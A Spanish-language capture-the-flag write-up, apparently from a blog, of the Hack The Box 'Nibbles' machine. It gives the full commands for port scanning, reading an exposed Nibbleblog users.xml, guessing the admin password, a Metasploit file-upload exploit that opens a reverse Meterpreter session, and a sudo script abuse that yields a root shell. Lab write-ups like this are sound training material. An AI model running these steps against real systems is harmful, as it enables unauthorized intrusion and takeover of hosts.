---
title: 'HTB Nibbles writeup'
date: 2025-03-11
permalink: /posts/2025/03/HTB-Nibbles-Writeup/
tags:
  - writeup
  - htb
  - metasploit
---
# Reconocimiento Inicial

Comencé con un escaneo básico usando Nmap para identificar puertos abiertos y servicios en la máquina objetivo (10.10.10.75). Ejecuté el siguiente comando:

nmap -p- -T4 -A -v 10.10.10.75


Output relevante:

PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2  
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))  


Solo había dos servicios activos: SSH y un servidor web. Me enfoqué en el puerto 80.

# Enumeración Web

Al acceder a http://10.10.10.75, la página mostraba un mensaje simple: "Hello World!". Inspeccioné el código fuente y encontré un comentario curioso:

< !-- /nibbleblog/ -->


Usé Dirbuster para descubrir directorios y archivos bajo /nibbleblog/. Configuré el diccionario directory-list-2.3-medium.txt y encontré:

http://10.10.10.75/nibbleblog/admin.php


Al acceder a esta URL, me topé con un panel de login. Probé credenciales comunes (admin:admin, admin:password), pero sin éxito. Además, noté que después de varios intentos fallidos, el sistema bloqueaba temporalmente las peticiones.

# Encontrando Credenciales


Recordé que muchos CMS almacenan usuarios en archivos XML. Probé acceder a:

http://10.10.10.75/nibbleblog/content/private/users.xml

Output:

<\user username="admin">
  <\ id type="integer">1 <\/id>
  <\ session_fail_count type="integer">0 <\/session_fail_count>
  <\ session_date type="integer">1527728762 <\/session_date>
<\/user>


Confirmé que el usuario era admin. Para la contraseña, probé combinaciones simples relacionadas con el nombre de la máquina: nibbles, Nibbles123, etc. La que funcionó fue admin:nibbles.
Explotación con Metasploit


Sabía que Nibbleblog 4.0.3 tenía una vulnerabilidad de subida de archivos. Usé el módulo de Metasploit:
bash

msfconsole  
use exploit/multi/http/nibbleblog_file_upload  
set RHOSTS 10.10.10.75  
set USERNAME admin  
set PASSWORD nibbles  
set LHOST 10.10.14.10  # Mi IP en HTB  
exploit  


Resultado:

Meterpreter session 1 opened (10.10.14.10:4444 -> 10.10.10.75:41846)  
meterpreter > shell  

Obtuve una shell como el usuario nibbler.

# Escalada de Privilegios

Primero revisé permisos de sudo:

sudo -l  

Output:

User nibbler may run the following commands on Nibbles:  
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh  


El script monitor.sh no existía, así que lo creé:

echo "bash -i" > monitor.sh  
chmod +x monitor.sh  


Luego, lo ejecuté con sudo:

sudo /home/nibbler/personal/stuff/monitor.sh  


Resultado:

root@Nibbles:/home/nibbler/personal/stuff# id  
uid=0(root) gid=0(root) groups=0(root)  


¡Conseguí acceso root!